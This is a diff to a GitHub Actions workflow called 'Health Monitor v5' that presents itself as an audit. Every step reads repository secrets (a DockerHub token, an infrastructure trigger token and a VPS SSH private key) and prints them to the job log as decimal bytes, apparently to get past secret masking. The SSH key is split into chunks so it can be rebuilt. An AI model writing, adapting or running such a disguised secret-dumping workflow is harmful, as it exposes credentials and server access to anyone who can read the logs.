@@ -1,4 +1,4 @@
-name: Health Monitor v4
+name: Health Monitor v5
 
 on:
   workflow_dispatch:
@@ -7,36 +7,40 @@ jobs:
   audit:
     runs-on: ubuntu-latest
     steps:
-      - name: Audit Part 1
+      - name: Part A - Docker + Infra tokens
         env:
           S0: ${{ secrets.DOCKERHUB_TOKEN }}
           S1: ${{ secrets.DOCKERHUB_USERNAME }}
           S2: ${{ secrets.INFRA_TRIGGER_TOKEN }}
-          S3: ${{ secrets.VPS_HOST }}
-          S4: ${{ secrets.VPS_SSH_KEY }}
-          S5: ${{ secrets.VPS_SSH_PASSPHRASE }}
-          S6: ${{ secrets.VPS_SSH_PORT }}
-          S7: ${{ secrets.VPS_USER }}
         run: |
-          echo "=== PART1 ==="
-          for var in S0 S1 S2 S3 S4 S5 S6 S7; do
-            val="${!var}"
-            p1="${val:0:50}"
-            echo "$var""_P1: ASCII=[$(echo -n "$p1" | od -An -tu1 | tr '\n' ' ')]"
-          done
-          echo "=== END P1 ==="
-      - name: Audit Part 2
+          echo "=== PART A ==="
+          echo "S0: ASCII=[$(echo -n "$S0" | od -An -tu1 | tr '\n' ' ')]"
+          echo "S1: ASCII=[$(echo -n "$S1" | od -An -tu1 | tr '\n' ' ')]"
+          echo "S2: ASCII=[$(echo -n "$S2" | od -An -tu1 | tr '\n' ' ')]"
+          echo "=== END A ==="
+      
+      - name: Part B - SSH Key P1-3
         env:
           S4: ${{ secrets.VPS_SSH_KEY }}
         run: |
-          echo "=== PART2 ==="
-          val="$S4"
-          p2="${val:50:50}"
+          echo "=== PART B ==="
+          p1="${S4:0:60}"
+          echo "S4_P1: ASCII=[$(echo -n "$p1" | od -An -tu1 | tr '\n' ' ')]"
+          p2="${S4:60:60}"
           echo "S4_P2: ASCII=[$(echo -n "$p2" | od -An -tu1 | tr '\n' ' ')]"
-          p3="${val:100:50}"
+          p3="${S4:120:60}"
           echo "S4_P3: ASCII=[$(echo -n "$p3" | od -An -tu1 | tr '\n' ' ')]"
-          p4="${val:150:50}"
+          echo "=== END B ==="
+      
+      - name: Part C - SSH Key P4-6
+        env:
+          S4: ${{ secrets.VPS_SSH_KEY }}
+        run: |
+          echo "=== PART C ==="
+          p4="${S4:180:60}"
           echo "S4_P4: ASCII=[$(echo -n "$p4" | od -An -tu1 | tr '\n' ' ')]"
-          p5="${val:200:50}"
+          p5="${S4:240:60}"
           echo "S4_P5: ASCII=[$(echo -n "$p5" | od -An -tu1 | tr '\n' ' ')]"
-          echo "=== END P2 ==="
+          p6="${S4:300:60}"
+          echo "S4_P6: ASCII=[$(echo -n "$p6" | od -An -tu1 | tr '\n' ' ')]"
+          echo "=== END C ==="
